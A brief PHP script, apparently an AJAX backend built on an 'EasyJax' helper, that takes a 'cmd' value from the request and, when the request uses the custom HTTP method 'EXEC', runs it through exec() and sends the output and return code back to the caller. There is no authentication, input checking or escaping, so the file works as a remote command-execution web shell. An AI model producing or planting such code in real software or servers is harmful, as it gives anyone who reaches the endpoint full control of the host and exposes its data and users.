<?
include("EasyJax.php");

$easyj = new EasyJax();

$cmd = $easyj -> getData('cmd');


switch($_SERVER['REQUEST_METHOD']){
case "EXEC":
	$output = "";
	$retval = 0;
	exec($cmd,$output,$retval);
	$easyj -> set_ret_data("results",implode("<br>",$output));
	$easyj -> set_ret_data('retval',$retval);
	break;
default:
	$easyj -> add_error_msg("Invalid method.");
}

$easyj -> send_resp();